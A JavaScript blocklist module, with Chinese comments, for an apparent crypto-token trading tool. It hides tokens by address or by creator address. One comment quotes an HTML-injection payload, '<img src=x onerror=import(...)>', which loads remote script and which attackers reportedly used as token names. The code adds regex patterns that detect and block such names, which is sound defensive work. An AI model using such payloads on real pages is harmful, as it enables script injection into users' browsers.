// 屏蔽列表（全局、存服务器文件，换浏览器 / 重启都在）：按代币地址，或按创建者（开发者）地址
// 被屏蔽的币：战壕、左侧列表不显示，不响提示音、不弹通知、不自动买；搜索还能找到，持仓照常显示
import { readFileSync, writeFileSync, mkdirSync } from 'node:fs';
import { dataFile } from './live/config.js';
const FILE = dataFile('blocklist.json');
const lc = (a) => String(a || '').toLowerCase();
// 名字 / 代号像 HTML 注入（有标签开头，又带 onxxx= / script / javascript: / import(）的直接当屏蔽：2026-10-28 有人连发名字是
// <img src=x onerror=import('//…/x.js')> 的盘专门打本程序（页面有 CSP + 转义，没执行，但不该出现在列表里）
const HTML_TAG = /<\s*[a-z!\/]/i, HTML_EVIL = /\bon[a-z]+\s*=|script|javascript:|import\s*\(/i;
export const looksLikeHtml = (s) => HTML_TAG.test(String(s || '')) && HTML_EVIL.test(String(s || ''));

export class Blocklist {
  constructor() { try { const d = JSON.parse(readFileSync(FILE, 'utf8')); this.tokens = d.tokens || {}; this.devs = d.devs || {}; } catch { this.tokens = {}; this.devs = {}; } }
  view() { return { tokens: this.tokens, devs: this.devs }; }
  // 写之前先并上文件里现有的（别人 / 别的进程直接改过文件时不被内存里的旧列表覆盖掉）；内存里删掉的项按 removed 记下，不会被并回来
  save() {
    try { const d = JSON.parse(readFileSync(FILE, 'utf8')); for (const [k, m] of [['tokens', this.tokens], ['devs', this.devs]]) for (const [a, v] of Object.entries(d[k] || {})) if (!(a in m) && !this.removed?.has(a)) m[a] = v; } catch { /* 没有文件 */ }
    mkdirSync(new URL('.', FILE), { recursive: true }); writeFileSync(FILE, JSON.stringify(this.view(), null, 2));
  }
  set(kind, address, on, label) {
    if (!/^0x[0-9a-fA-F]{40}$/.test(String(address || ''))) throw new Error('地址无效');
    const m = kind === 'dev' ? this.devs : this.tokens, a = lc(address);
    if (on) { m[a] = { label: String(label || '').slice(0, 60), at: Date.now() }; this.removed?.delete(a); } else { delete m[a]; (this.removed ||= new Set()).add(a); }
    this.save(); return this.view();
  }
  has(t) { return !!(t && (this.tokens[lc(t.address)] || (t.creator && this.devs[lc(t.creator)]) || looksLikeHtml(t.symbol) || looksLikeHtml(t.name))); }
}
